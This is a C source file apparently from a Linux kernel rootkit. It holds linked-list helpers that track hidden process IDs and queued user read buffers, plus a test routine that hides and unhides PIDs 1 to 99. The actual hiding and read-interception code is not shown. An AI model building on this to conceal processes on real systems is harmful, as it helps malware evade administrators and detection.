#include "queue.h"

void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr);
pid_t pid_list_pop(pid_t nr);
struct pid_list_node *pid_list_find(pid_t nr);
void pid_list_test(void);

struct pid_list_node *pid_list_head = NULL;
struct pid_list_node *pid_list_tail = NULL;

void create_read_list(void);
void destroy_read_list(void);
void create_read_queue(pid_t pid, char *ubuf, off_t from, off_t to);
struct read_queue *get_read_queue(pid_t pid);
void update_read_queue(pid_t pid, char *ubuf, off_t from, off_t to);
void destroy_read_queue(pid_t pid);

struct read_queue *read_list_head = NULL;
struct read_queue *read_list_tail = NULL;

void pid_list_test(void) {
    size_t i;

    /*
     * Testing pid_list
     */
    pid_list_create();

    for (i = 1; i < 100; i++) {
        hide_pid(i);
        unhide_pid(i);
    }

    for(i = 1; i < 100; i++) {
        hide_pid(i);
    }

    for (i = 1; i < 100; i++) {
        unhide_pid(i);
    }

    for (i = 1; i < 100; i++) {
        hide_pid(i);
    }

    pid_list_destroy();
}

void pid_list_push(pid_t nr) {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		pid_list_tail->next = node;
		pid_list_tail = node;
		node->next = NULL;
		node->nr = nr;
	} else {
		perr("f_kmalloc() error at line %d, file %s.\n", __LINE__, __FILE__);
	}
}

struct pid_list_node *pid_list_find(pid_t nr) {
	struct pid_list_node *node;

	node = pid_list_head;
	while(node) {
        if (node->nr == nr) {
			return node;
		}
		node = node->next;
	}

	return NULL;
}

pid_t pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;

	prev = node = pid_list_head;
	while(node) {
		if (node->nr == nr) {
			prev->next = node->next;
			if (pid_list_tail == node) {
				pid_list_tail = prev;
			}
			f_kfree(node);

			return nr;
		}
		prev = node;
		node = node->next;
	}

	return -1;
}

void pid_list_create(void) {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->nr = 0;

	pid_list_head = pid_list_tail = node;
}

void pid_list_destroy(void) {
	while(pid_list_head->next) {
		unhide_pid(pid_list_tail->nr);
	}

	f_kfree(pid_list_head);
}

void create_read_list(void) {
	struct read_queue *node;

	node = f_kmalloc(sizeof(struct read_queue), GFP_KERNEL);
	node->next = NULL;
	node->pid = 0;
	node->ubuf = NULL;
	node->from = 0;
	node->to = 0;

	read_list_head = read_list_tail = node;
}

void destroy_read_list(void) {
	while(read_list_head->next) {
		destroy_read_queue(read_list_tail->pid);
	}

	f_kfree(read_list_head);
}

void create_read_queue(pid_t pid, char *ubuf, off_t from, off_t to) {
	struct read_queue *node;

	node = f_kmalloc(sizeof(struct read_queue), GFP_KERNEL);
	if (node) {
		read_list_tail->next = node;
		read_list_tail = node;
		node->next = NULL;
		node->pid = pid;
		node->ubuf = ubuf;
		node->from = from;
		node->to = to;
	} else {
		perr("f_kmalloc() error at line %d, file %s.\n", __LINE__, __FILE__);
	}
}

struct read_queue *get_read_queue(pid_t pid) {
	struct read_queue *node;

	node = read_list_head;
	while(node) {
        if (node->pid == pid) {
			return node;
		}
		node = node->next;
	}

	return NULL;
}

void update_read_queue(pid_t pid, char *ubuf, off_t from, off_t to) {
	struct read_queue *node = NULL;

	if ((node = get_read_queue(pid))) {
		node->ubuf = ubuf;
		node->from = from;
		node->to = to;
	}
}

void destroy_read_queue(pid_t pid) {
	struct read_queue *node, *prev;

	prev = node = read_list_head;
	while(node) {
		if (node->pid == pid) {
			prev->next = node->next;
			if (read_list_tail == node) {
				read_list_tail = prev;
			}
			f_kfree(node);
			return;
		}
		prev = node;
		node = node->next;
	}
}
